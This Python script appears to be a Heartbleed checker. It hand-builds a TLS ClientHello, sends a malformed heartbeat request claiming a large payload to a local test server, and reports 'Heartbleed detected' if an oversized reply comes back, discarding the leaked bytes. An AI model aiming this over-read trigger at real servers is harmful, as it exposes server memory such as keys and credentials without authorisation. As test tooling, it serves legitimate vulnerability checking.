import socket
import struct
import os

rec_type = b'\x16'
rec_version = b'\x03\x01'
rec_length = b'\x01\x3a'
handshake_type = b'\x01'
handshake_length = b'\x00\x01\x36'
handshake_version = b'\x03\x03'
random = os.urandom(32)
session_id_length = b'\x00'
cipher_suites_length = b'\x00\xa0'
cipher_suites = (
    b"\xc0\x30\xc0\x2c\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x22\xc0\x21" 
    b"\x00\xa3\x00\x9f\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87" 
    b"\xc0\x32\xc0\x2e\xc0\x2a\xc0\x26\xc0\x0f\xc0\x05\x00\x9d\x00\x3d" 
    b"\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13" 
    b"\xc0\x0d\xc0\x03\x00\x0a\xc0\x2f\xc0\x2b\xc0\x27\xc0\x23\xc0\x13" 
    b"\xc0\x09\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00\x67\x00\x40\x00\x33" 
    b"\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x31\xc0\x2d\xc0\x29" 
    b"\xc0\x25\xc0\x0e\xc0\x04\x00\x9c\x00\x3c\x00\x2f\x00\x96\x00\x41" 
    b"\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15" 
    b"\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff" 
)
compression_methods_length = b'\x01'
compression_methods = b'\x00'
extensions = (
    b"\x00\x6d" 
    b"\x00\x0b\x00\x04\x03\x00\x01\x02" 
    b"\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c" 
    b"\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07" 
    b"\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02" 
    b"\x00\x03\x00\x0f\x00\x10\x00\x11" 
    b"\x00\x23\x00\x00" 
    b"\x00\x0d\x00\x20\x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02" 
    b"\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01" 
    b"\x02\x02\x02\x03" 
    b"\x00\x0f\x00\x01\x01" 
)

client_hello = (
    rec_type +
    rec_version +
    rec_length +
    handshake_type +
    handshake_length +
    handshake_version +
    random + 
    session_id_length +
    cipher_suites_length + 
    cipher_suites + 
    compression_methods_length + 
    compression_methods +
    extensions
)

hb = b'\x18\x03\x03\x00\x03\x01\x40\x00\x00'

def recive_server_hello(sock):
    hdr = sock.recv(5)
    typ, ver, ln = struct.unpack('>BHH', hdr)
    sock.recv(ln)

def recive_certificate(sock):
    hdr = sock.recv(5)
    typ, ver, ln = struct.unpack('>BHH', hdr)
    sock.recv(ln)

def recive_serve_key_exchange(sock):
    hdr = sock.recv(5)
    typ, ver, ln = struct.unpack('>BHH', hdr)
    sock.recv(ln)

def recive_server_hello_done(sock):
    hdr = sock.recv(5)
    typ, ver, ln = struct.unpack('>BHH', hdr)
    sock.recv(ln)

def recive_heartbeet_response(sock):
    hdr = sock.recv(5)
    typ, ver, ln = struct.unpack('>BHH', hdr)
    sock.recv(ln)
    if typ == 24 and ln > 1:
        print('Heartbleed detected.')

if __name__ == '__main__':
    host = '127.0.0.1'
    port = 44330
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(client_hello)
    recive_server_hello(sock)
    recive_certificate(sock)
    recive_serve_key_exchange(sock)
    recive_server_hello_done(sock)
    sock.send(hb)
    recive_heartbeet_response(sock)

    print('done')
